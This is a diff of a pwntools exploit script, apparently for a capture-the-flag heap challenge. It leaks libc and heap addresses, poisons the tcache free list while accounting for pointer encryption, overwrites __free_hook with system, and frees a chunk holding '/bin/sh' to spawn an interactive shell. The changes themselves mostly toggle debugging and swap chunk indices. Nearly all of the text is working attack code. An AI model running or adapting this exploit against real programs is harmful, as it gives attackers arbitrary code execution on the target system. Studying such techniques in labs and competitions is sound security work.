@@ -1,7 +1,7 @@
 from pwn import *
 
 context.log_level = 'debug'
-#context.terminal = ["/usr/bin/tmux", "sp", "-h"]
+context.terminal = ["/usr/bin/tmux", "sp", "-h"]
 
 f_debug = False if "remote" in sys.argv else True
 
@@ -51,7 +51,9 @@ add(3, 0x500, b"abc")
 
 delete(0)
 add(5, 0x538, b"abc")
+
 show(0)
+
 libcmain_offset = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
 success("main_arena -> " + hex(libcmain_offset))
 libc.address = libcmain_offset - 0x1e4030
@@ -65,6 +67,7 @@ success("tcachebins -> " + hex(tcachebins))
 
 # leak heap_ptr
 edit(0, b'a' * 0x10)
+
 show(0)
 io.recvuntil(b"a" * 0x10)
 heap_ptr = u64(io.recvn(6).ljust(8, b"\x00"))
@@ -89,11 +92,11 @@ delete(7)
 delete(6)
 
 success("free_hook_address_enc -> " + hex(free_hook_address ^ ((heap_ptr + 0x2410) >> 12)))
-
+ddebug()
 edit(6, p64(free_hook_address ^ ((heap_ptr + 0x2410) >> 12)))
 add(6, 0x550, b"abc")
 add(7, 0x550, b"abc")
 edit(7, p64(system))
-edit(6, b'/bin/sh\x00')
-delete(6)
+edit(5, b'/bin/sh\x00')
+delete(5)
 io.interactive()
